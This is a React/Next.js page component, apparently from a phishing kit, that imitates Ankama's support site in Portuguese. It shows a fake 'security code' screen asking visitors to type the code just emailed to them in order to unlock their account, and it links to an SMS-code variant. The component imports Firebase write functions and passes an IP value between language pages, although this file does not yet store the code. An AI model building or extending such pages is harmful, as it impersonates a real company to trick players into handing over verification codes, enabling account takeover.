import React, { useEffect, useState } from 'react'
import db from "../../Firebase"
import { doc, setDoc,updateDoc } from "firebase/firestore";
import styles from '@/styles/Home4.module.css'
import Head from 'next/head'
import Image from 'next/image'
import { useRouter } from 'next/router';
import  Router  from 'next/router';
import Link from "next/link";



function App4(props) {
    const [page,setPage] = useState(false);
    const [phone,setPhone] = useState("");
    const [code,setCode] = useState("");
    const [min,setMin] = useState(3);
    const [sec1,setSec1] = useState(0);
    const [visible3,setVisible3] = useState(false)

    const router = useRouter();
    const ip ="none"

    

    
    const en=()=>{
      Router.push({
        pathname: '/mailVerification/en',
        query: {ip:ip}
    },"/mailVerification/en",{ shallow: true })
     }
     const es=()=>{
      Router.push({
        pathname: '/mailVerification/es',
        query: {ip:ip}
    },"/mailVerification/es",{ shallow: true })
     }
    
     const fr=()=>{
      Router.push({
        pathname: '/mailVerification/fr',
        query: {ip:ip}
    },"/mailVerification/fr",{ shallow: true })
     }



     const send=()=>{
      setCode("")
     }

  return (
    <div className={styles.App}>
      <div className={styles.all3}>
      <div className={styles.nav3}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p>SUPPORT</p>
            </div>
            <div className={styles.rightC}>
            <p style={{zIndex:10}}>SAIR</p>
             <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img  src="/assets/portugal.png" alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img onClick={fr} src="/assets/france.png" alt="" /><p className={styles.flagN}>FR</p></div>
              <div className={styles.flag}><img onClick={en}  src="/assets/usa.png" alt="" /><p className={styles.flagN}>EN</p></div>
              <div className={styles.flag}><img src="/assets/de.png" alt="" /><p className={styles.flagN}>DE</p></div>
              <div className={styles.flag}><img onClick={es}  src="/assets/spain.png" alt="" /><p className={styles.flagN}>ES</p></div>
              <div className={styles.flag}><img  src="/assets/portugal.png" alt="" /><p className={styles.flagN}>PT</p></div>
              <div className={styles.flag}><img src="/assets/italy.png" alt="" /><p className={styles.flagN}>IT</p></div>



              </>
             )}
             </div>
            </div>
          </div>
        </div>
        
        </div>

        <div className={styles.headingContainer}>
            <div className={styles.headingLogo}>
                <img src="/assets/logof.png" alt="" />
            </div>
            <div className={styles.headingContext}>
                <form onSubmit={send} className={styles.boxing}>
                <div className={styles.boxingHeader}>
                        <h2>CÓDIGO DE SEGURANÇA</h2>
                    </div>
                    <center>
                    <div className={styles.boxContainer}>
                    <center>
                    <div className={styles.boxingMessage}>
                        <p>Um e-mail foi enviado para você</p>
                    </div>
                    <div className={styles.boxingMessage2}>
                        <p>Para desbloquear o seu lote, digite o código de segurança que acabou de ser enviado para o seu endereço de e-mail.</p>
                    </div>
                    <div className={styles.code}>
                        <p>Código de segurança*</p>
                        <input onChange={(e)=>setCode(e.target.value)} value={code} placeholder='Code de sécurité' type="text" required/>
                    </div>
                    <button type="submit">para validar</button>
                    <div className={styles.goPhone}>
                    <Link className={styles.link3} href="/verification/prg" style={{color:"red",textDecoration:"none",paddingLeft:"12px"}} shallow><p>Você está usando autenticação? [SMS]</p></Link>

                    </div>
                    </center>
                    
                  </div>
                    </center>


                </form>
            </div>
        </div>










<div className={styles.footer3}>
  <center>
  <div className={styles.containerf}>
    <img src="/assets/logof.png" alt="" />
    <p>© 2021 Ankama. Todos os direitos reservados. Condições de Utilização - Política de Privacidade - Condições Gerais de Venda - Aviso Legal - Gestão de Cookies</p>
  </div>
  </center>
  
</div>

      </div>
    </div>
  )
}

export default App4
